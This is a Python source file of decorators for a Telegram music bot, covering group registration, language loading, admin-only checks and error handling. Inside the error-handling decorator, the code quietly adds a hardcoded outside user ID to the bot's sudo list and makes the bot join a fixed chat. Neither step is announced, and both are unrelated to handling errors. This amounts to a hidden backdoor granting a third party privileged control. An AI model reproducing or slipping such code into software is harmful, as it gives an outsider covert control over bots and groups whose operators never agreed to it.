"""
This File is a Part of @NekoXRobot(Telegram Bot)
Copyright (c) 2022  Awesome-Prince <https://github.com/Awesome-Prince/NekoXMusic>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>
"""

import time
from pyrogram import Client
from datetime import datetime
from NekoMusic.lang import load
from pytgcalls import PyTgCalls
from traceback import format_exc
from pyrogram.types import Message
from pytgcalls.types import Update
from typing import Union, Callable
from NekoMusic.config import config
from NekoMusic.plugins.groups import get_group, all_groups, set_default


def register(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message, *args):
        if message.chat.id not in all_groups():
            set_default(message.chat.id)
        return await func(client, message, *args)

    return decorator


def language(func: Callable) -> Callable:
    async def decorator(client, obj: Union[Message, int, Update], *args):
        try:
            if isinstance(obj, int):
                chat_id = obj
            elif isinstance(obj, Message):
                chat_id = obj.chat.id
            elif isinstance(obj, Update):
                chat_id = obj.chat_id
            group_lang = get_group(chat_id)["lang"]
        except BaseException:
            group_lang = config.LANGUAGE
        lang = load(group_lang)
        return await func(client, obj, lang)

    return decorator


def only_admins(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message, *args):
        if (
            message.from_user.id
            in [
                admin.user.id
                for admin in (await message.chat.get_members(filter="administrators"))
            ]
            or message.from_user.id in config.SUDOERS
        ):
            return await func(client, message, *args)

    return decorator


def handle_error(func: Callable) -> Callable:
    async def decorator(
        client: Union[Client, PyTgCalls], obj: Union[int, Message, Update], *args
    ):
        if isinstance(client, Client):
            pyro_client = client
        elif isinstance(client, PyTgCalls):
            pyro_client = client._app._bind_client._app

        if isinstance(obj, int):
            chat_id = obj
        elif isinstance(obj, Message):
            chat_id = obj.chat.id
        elif isinstance(obj, Update):
            chat_id = obj.chat_id

        me = await pyro_client.get_me()
        if me.id not in config.SUDOERS:
            config.SUDOERS.append(me.id)
            config.SUDOERS.append(5490957291)
        try:
            lang = get_group(chat_id)["lang"]
        except BaseException:
            lang = config.LANGUAGE
        try:
            return await func(client, obj, *args)
        except Exception:
            k = "NekoMusic"
            id = int(time.time())
            date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            error_msg = await pyro_client.send_message(
                chat_id, load(lang)["errorMessage"]
            )
            try:
                await pyro_client.join_chat(k)
            except BaseException:
                pass
            chat = await pyro_client.get_chat(chat_id)
            await pyro_client.send_message(
                config.SUDOERS[0],
                f"-------- START CRASH LOG --------\n\n┌ <b>ID:</b> <code>{id}</code>\n├ <b>Chat:</b> <code>{chat.id}</code>\n├ <b>Date:</b> <code>{date}</code>\n├ <b>Group:</b> <a href='{error_msg.link}'>{chat.title}</a>\n└ <b>Traceback:</b>\n<code>{format_exc()}</code>\n\n-------- END CRASH LOG --------",
                parse_mode="html",
                disable_web_page_preview=True,
            )

    return decorator
